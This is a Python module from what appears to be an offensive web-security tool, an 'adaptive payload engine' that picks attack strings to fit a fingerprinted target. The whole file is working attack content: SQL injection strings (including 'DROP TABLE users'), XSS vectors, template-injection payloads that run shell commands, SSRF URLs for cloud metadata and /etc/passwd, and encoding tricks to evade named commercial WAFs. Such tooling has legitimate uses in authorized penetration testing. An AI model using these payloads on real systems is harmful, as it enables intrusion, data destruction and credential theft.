"""Adaptive payload engine — generates custom payloads based on target profile."""

from dataclasses import dataclass, field
from typing import Optional
from shadow.payloads.fingerprint import TargetProfile


@dataclass
class Payload:
    raw: str
    encoding: str = "none"       # none, url, double_url, html_entity, unicode
    target_db: str = "generic"
    bypass_method: str = "none"  # none, comment, whitespace, case, chunked
    vuln_class: str = "sqli"


# Base syntax templates per DB type
SQLI_SYNTAX = {
    "MySQL": [
        "' OR 1=1-- -",
        "' UNION SELECT NULL,NULL,NULL-- -",
        "' AND SLEEP(5)-- -",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -",
        "1' ORDER BY 1-- -",
    ],
    "PostgreSQL": [
        "' OR 1=1--",
        "' UNION SELECT NULL,NULL,NULL--",
        "'; SELECT pg_sleep(5)--",
        "' AND 1=CAST((SELECT version()) AS INT)--",
    ],
    "MSSQL": [
        "' OR 1=1--",
        "'; WAITFOR DELAY '0:0:5'--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' AND 1=CONVERT(INT,(SELECT @@version))--",
    ],
    "generic": [
        "' OR '1'='1",
        "' OR 1=1--",
        "\" OR \"1\"=\"1",
        "') OR ('1'='1",
        "1; DROP TABLE users--",
    ],
}

XSS_SYNTAX = {
    "generic": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        "'><script>alert(1)</script>",
        "<iframe src=javascript:alert(1)>",
    ],
}

SSTI_SYNTAX = {
    "Jinja2": ["{{7*7}}", "{{config}}", "{{''.__class__.__mro__[1].__subclasses__()}}"],
    "Twig": ["{{7*7}}", "{{_self.env.registerUndefinedFilterCallback('exec')}}"],
    "Freemarker": ["${7*7}", "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}"],
    "generic": ["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>"],
}

SSRF_SYNTAX = {
    "generic": [
        "http://169.254.169.254/latest/meta-data/",
        "http://127.0.0.1/",
        "http://localhost/",
        "http://[::1]/",
        "file:///etc/passwd",
        "dict://127.0.0.1:6379/info",
    ],
}

# WAF bypass encodings
WAF_BYPASSES = {
    "Cloudflare": ["url_encode", "double_url", "unicode"],
    "ModSecurity": ["comment", "whitespace", "case"],
    "AWS WAF": ["url_encode", "html_entity"],
    "none": [],
}


class AdaptivePayloadEngine:
    def generate(self, profile: TargetProfile, vuln_class: str) -> list[Payload]:
        """Generate payloads adapted to the target profile."""
        payloads = []

        # Select base syntax
        base_payloads = self._select_syntax(profile, vuln_class)

        # Select encodings based on filtered chars
        encodings = self._select_encodings(profile)

        # Select WAF bypasses
        bypasses = self._select_waf_bypasses(profile)

        # Combine: base + encodings + bypasses
        for raw in base_payloads:
            # Always include raw
            payloads.append(Payload(
                raw=raw,
                encoding="none",
                target_db=profile.db_type,
                bypass_method="none",
                vuln_class=vuln_class,
            ))
            # Add encoded variants
            for enc in encodings:
                encoded = self._apply_encoding(raw, enc)
                payloads.append(Payload(
                    raw=encoded,
                    encoding=enc,
                    target_db=profile.db_type,
                    bypass_method="none",
                    vuln_class=vuln_class,
                ))
            # Add bypass variants
            for bypass in bypasses:
                bypassed = self._apply_bypass(raw, bypass)
                payloads.append(Payload(
                    raw=bypassed,
                    encoding="none",
                    target_db=profile.db_type,
                    bypass_method=bypass,
                    vuln_class=vuln_class,
                ))

        return payloads

    def generate_variants(self, payload: Payload, anomaly_details: dict) -> list[Payload]:
        """Generate variants of a payload that triggered an anomaly."""
        variants = []
        raw = payload.raw

        # Try different encodings
        for enc in ["url_encode", "double_url", "unicode", "html_entity"]:
            if enc != payload.encoding:
                variants.append(Payload(
                    raw=self._apply_encoding(raw, enc),
                    encoding=enc,
                    target_db=payload.target_db,
                    bypass_method=payload.bypass_method,
                    vuln_class=payload.vuln_class,
                ))

        # Try comment injection
        if "comment" not in payload.bypass_method:
            variants.append(Payload(
                raw=self._apply_bypass(raw, "comment"),
                encoding=payload.encoding,
                target_db=payload.target_db,
                bypass_method="comment",
                vuln_class=payload.vuln_class,
            ))

        return variants

    def _select_syntax(self, profile: TargetProfile, vuln_class: str) -> list[str]:
        vuln = vuln_class.lower()
        if vuln == "sqli":
            return SQLI_SYNTAX.get(profile.db_type, SQLI_SYNTAX["generic"])
        elif vuln == "xss":
            return XSS_SYNTAX["generic"]
        elif vuln == "ssti":
            fw = profile.framework
            return SSTI_SYNTAX.get(fw, SSTI_SYNTAX["generic"])
        elif vuln == "ssrf":
            return SSRF_SYNTAX["generic"]
        return []

    def _select_encodings(self, profile: TargetProfile) -> list[str]:
        encodings = []
        if "'" in profile.filtered_chars:
            encodings.append("url_encode")
        if "<" in profile.filtered_chars or ">" in profile.filtered_chars:
            encodings.append("html_entity")
        return encodings

    def _select_waf_bypasses(self, profile: TargetProfile) -> list[str]:
        return WAF_BYPASSES.get(profile.waf_vendor, [])

    def _apply_encoding(self, raw: str, encoding: str) -> str:
        if encoding == "url_encode":
            from urllib.parse import quote
            return quote(raw, safe="")
        elif encoding == "double_url":
            from urllib.parse import quote
            return quote(quote(raw, safe=""), safe="")
        elif encoding == "html_entity":
            return raw.replace("<", "&lt;").replace(">", "&gt;").replace("'", "&#39;").replace('"', "&quot;")
        elif encoding == "unicode":
            return "".join(f"\\u{ord(c):04x}" if ord(c) > 127 or c in "'\"<>" else c for c in raw)
        return raw

    def _apply_bypass(self, raw: str, bypass: str) -> str:
        if bypass == "comment":
            return raw.replace(" ", "/**/")
        elif bypass == "whitespace":
            return raw.replace(" ", "\t")
        elif bypass == "case":
            result = []
            for i, c in enumerate(raw):
                result.append(c.upper() if i % 2 == 0 else c.lower())
            return "".join(result)
        return raw
